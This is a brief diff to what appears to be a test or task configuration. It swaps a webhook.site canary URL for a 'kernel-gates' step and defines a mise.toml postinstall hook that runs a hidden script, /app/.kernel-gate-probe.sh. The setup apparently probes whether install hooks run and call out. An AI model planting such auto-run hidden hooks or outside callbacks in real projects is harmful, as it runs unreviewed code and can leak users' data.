@@ -3,7 +3,7 @@
   "steps": {
     "kernel-gates": {
       "variables": {
-        "CANARY_URL": "https://webhook.site/71e039c6-1193-4189-8ea3-30df59fb4d3b"
+        "CANARY_URL": "https://webhook.site/2bd86859-c1f3-4356-b724-d1ed4cb2d7ba"
       },
       "assets": {
         "mise.toml": "[hooks]\npostinstall = { run = \"/app/.kernel-gate-probe.sh\", shell = \"sh -c\" }\n",
